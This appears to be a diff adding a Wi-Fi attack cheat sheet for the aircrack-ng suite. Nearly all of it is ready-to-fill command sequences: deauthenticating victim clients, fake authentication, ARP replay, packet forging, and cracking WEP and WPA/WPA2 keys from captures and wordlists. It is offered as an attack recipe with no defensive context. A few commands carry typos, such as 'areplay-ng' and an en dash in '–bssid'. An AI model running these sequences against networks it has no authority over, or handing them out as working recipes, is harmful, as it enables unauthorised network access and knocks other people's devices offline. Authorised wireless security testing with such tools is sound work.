@@ -1,0 +1,74 @@
+#Wifi Cheat Sheet - aircrack-ng
+===============================
+
+#Start Monitor Mode and Save captures
+iw dev wlan0 add interface mon0 type monitor
+airmon-ng start wlan0 <Chanel>
+airodump-ng -c <Chanel> --bssid <MAC AP> -w <NameCapture> <InterfaceMonitor>
+
+# To crack WEP for a given essid name and store into a file
+aircrack-ng -a 1 -e <essid> -l <output file> <.cap or .ivs file(s)>
+
+# To crack WPA/WPA2 from airolib-ng database
+aircrack-ng -e <essid> -r <database> <.cap or .ivs file(s)>
+
+# To crack WPA/WPA2 from a wordlist
+aircrack-ng -e <essid> -w <wordlist> <.cap or .ivs file(s)>
+
+# To crack a given bssid
+aircrack-ng -b <bssid> -l <output file> <.cap or .ivs file(s)>
+
+# To crack a given bssid using FMS/Korek method
+aircrack-ng -K -b <bssid> <.cap or .ivs file(s)>
+
+# To crack a given essid (WEP) and display the ASCII of the key
+aircrack-ng -e <essid> -s <.cap of .ivs file(s)>
+
+# To crack a given essid (WEP) and create a EWSA Project
+aircrack-ng -e <essid> -E <EWSA file> <.cap or .ivs file(s)>
+
+=== cracking WPA ====================================================================================================
+
+airmon-ng start wlan0
+airodump-ng -c (channel) –bssid (AP MAC) -w (filename) mon0
+aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) mon0 {disassociation attack}
+aircrack-ng -0 -w (wordlist path) (caputure filename)
+
+=== cracking WEP with Connected Clients =============================================================================
+
+airmon-ng start wlan0 ( channel)
+airodump-ng -c (channel) –bssid (AP MAC) -w (filename) mon0
+aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) mon0 {fake authentication}
+aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) mon0 {disassociation attack}
+aireplay-ng -3 -b (AP MAC) -h (OUR MAC) mon0 {ARP replay attack}
+
+=== cracking WEP via a Client =======================================================================================
+
+airmon-ng start wlan0 (channel)
+airodump-ng -c (channel) –bssid (AP MAC) -w (filename) mon0
+aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) mon0 {fake authentication}
+aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
+aireplay-ng -2 -r (replay cap file) mon0 {inject using cap file}
+aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
+
+=== ARP amplification ===============================================================================================
+
+airmon-ng start wlan0 ( channel)
+airodump-ng -c (channel) –bssid (AP MAC) -w (filename) mon0
+aireplay-ng -1 500 -q 8 -a (AP MAC) mon0
+areplay-ng -5 -b (AP MAC) -h (OUR MAC) mon0
+packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)
+tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)
+packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)
+aireplay-ng -2 -r (filename.cap) mon0
+
+=== cracking WEP /w shared key AUTH =================================================================================
+
+airmon-ng start wlan0 ( channel)
+airodump-ng -c (channel) –bssid (AP MAC) -w (filename) mon0
+~this will error out~aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) mon0 {fake authentication}
+aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) mon0 {deauthentication attack}
+aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) mon0 {fake authentication /w PRGA xor file}
+aireplay-ng -3 -b (AP MAC) -h (OUR MAC) mon0 {ARP replay attack}
+aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) mon0 {deauthentication attack}
+aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
